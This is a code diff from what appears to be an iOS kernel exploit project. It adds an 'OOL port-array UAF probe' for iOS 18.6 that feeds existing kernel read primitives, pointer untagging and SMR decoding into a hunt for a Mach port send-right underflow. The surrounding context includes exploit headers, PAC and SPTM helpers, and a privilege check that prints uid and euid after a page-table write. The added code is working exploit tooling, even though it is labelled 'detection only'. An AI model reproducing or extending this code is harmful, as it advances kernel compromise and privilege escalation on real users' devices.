@@ -47,6 +47,7 @@ extern kern_return_t mach_vm_deallocate(vm_map_read_t target_task, mach_vm_addre
 #import "exploit/kutils.h"          // proc_self() — direct own-proc VA, no allproc walk
 #import "exploit/krw_zone_write.h"  // clamped 0x20 writes — raw kwritebuf is 32-byte RMW
 #import "exploit/offsets.h"
+#import "exploit/ool-uaf-probe.h"
 #import "TaskRop/pac.h"         // off_proc_ro_pr_task / off_task_map
 #import "TaskRop/rc.h"           // kp_arm_thread_state64_internal, KP_TH_IN_MACH_EXCEPTION
 
@@ -3637,6 +3638,56 @@ static NSString *kpFmtSptmFn(uint64_t raw)
     [r appendFormat:@"\n[VERIFY] GETUID=%d GETEUID=%d P1=%d WROTE=%d HIT_DART=%d HIT_TYPE=0x%x SWAP_PTE=%d\n",
      (int)getuid(), (int)geteuid(), p1 ? 1 : 0, (int)wrote, (int)hitDart, hitType & 0xff, rbP == newPte ? 1 : 0];
     [r appendString:@"=== C3-WRITE done ===\n"];
+    return r;
+}
+
+/* ---- OOL port-array UAF probe (iOS 18.6: no ool_port_array_enforced) ---- */
+static uint64_t kpSMRDecode(uint64_t value); /* fwd — defined below */
+
+static int ool_kread(uint64_t addr, void *buf, size_t len) {
+    return gPrimitives.kreadbuf ? (gPrimitives.kreadbuf(addr, buf, len) == 0 ? 0 : -1) : -1;
+}
+static uint64_t ool_untag(uint64_t p) { return kp_untag_ptr(p); }
+static uint64_t ool_smr(uint64_t v) { return kpSMRDecode(v); }
+
++ (NSString *)oolPortArrayProbeReport {
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== OOL port-array UAF probe (18.6: ool_port_array_enforced absent) ===\n"];
+    [r appendString:@"duplicate-name MOVE_SEND/MAKE_SEND → ip_srights underflow hunt. Detection only.\n"];
+
+    ool_uaf_krw_t krw;
+    memset(&krw, 0, sizeof(krw));
+    krw.kread = ool_kread;
+    krw.untag = ool_untag;
+    krw.smr_decode = ool_smr;
+
+    uint64_t selfProc = proc_self();
+    if (!selfProc) {
+        [r appendString:@"FAIL: proc_self() returned 0 — probe runs without KRW snapshot\n"];
+    } else {
+        uint64_t procRo = 0, task = 0;
+        if (kpRead(selfProc + koffsetof(proc, proc_ro), &procRo, sizeof(procRo), "proc.proc_ro", r)) {
+            procRo = kp_untag_ptr(procRo);
+            if (kpLooksLikeKernelPointer(procRo) &&
+                kpRead(procRo + off_proc_ro_pr_task, &task, sizeof(task), "proc_ro.pr_task", r)) {
+                krw.self_task_va = kp_untag_ptr(task);
+                kpNote(r, [NSString stringWithFormat:@"  selfProc=%#llx proc_ro=%#llx task=%#llx",
+                           (unsigned long long)selfProc, (unsigned long long)procRo,
+                           (unsigned long long)krw.self_task_va]);
+            }
+        }
+        krw.off_task_itk_space      = off_task_itk_space;
+        krw.off_ipc_space_is_table  = off_ipc_space_is_table;
+        krw.off_ipc_entry_ie_object = off_ipc_entry_ie_object;
+        krw.off_ipc_port_ip_kobject = off_ipc_port_ip_kobject;
+        krw.off_ipc_port_ip_srights = 0; /* calibrated live */
+        krw.off_ipc_port_ip_mscount = 0;
+    }
+
+    static char cbuf[256 * 1024];
+    size_t n = ool_uaf_probe_run(cbuf, sizeof(cbuf), krw.self_task_va ? &krw : NULL);
+    if (n) [r appendFormat:@"%s", cbuf];
+    else   [r appendString:@"FAIL: ool_uaf_probe_run returned 0\n"];
     return r;
 }
 
